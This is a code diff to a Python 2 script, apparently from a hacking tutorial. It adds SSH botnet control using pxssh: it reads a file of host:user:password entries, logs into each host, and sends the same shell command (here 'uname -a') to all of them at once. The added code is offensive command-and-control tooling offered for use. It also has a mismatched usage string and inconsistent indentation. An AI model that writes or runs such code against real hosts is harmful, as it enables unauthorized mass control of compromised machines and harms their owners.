@@ -2,6 +2,7 @@
 
 import optparse
 import pxssh
+botNet = []
 
 class Client:
 	def __init__(self, host, user, password):
@@ -24,8 +25,34 @@ class Client:
 		self.session.prompt()
 		return self.session.before
 
+def botnetCommand(command):
+	for client in botNet:
+		output = client.send_command(command)
+		print '[*] Output from ' + client.host
+		print '[+] ' + output + '\n'
+
+def addClient(host, user, password):
+	client = Client(host, user, password)
+	botNet.append(client)
 
 def main():
+	parser = optparse.OptionParser("%prog -H <hash file> -D <dict file> -A <algorithm>")
+	parser.add_option('-L', dest='myFile', type='string', help='specify bot file to communicate with')
+	(options, args) = parser.parse_args()
+	myFile = options.myFile
+	if (myFile == None):
+		print '[-] You are missing arguments please run with --help option'
+	        exit(0)
+
+	myBots = open(myFile, 'r')
+	for xlist in myBots.readlines():
+		xHost = xlist.split(':')[0]
+		xUser = xlist.split(':')[1]
+		xPass = xlist.split(':')[2]
+		addClient(xHost, xUser, xPass)
+	botnetCommand('uname -a')
 
 if __name__ == '__main__':
 	main()
+
+
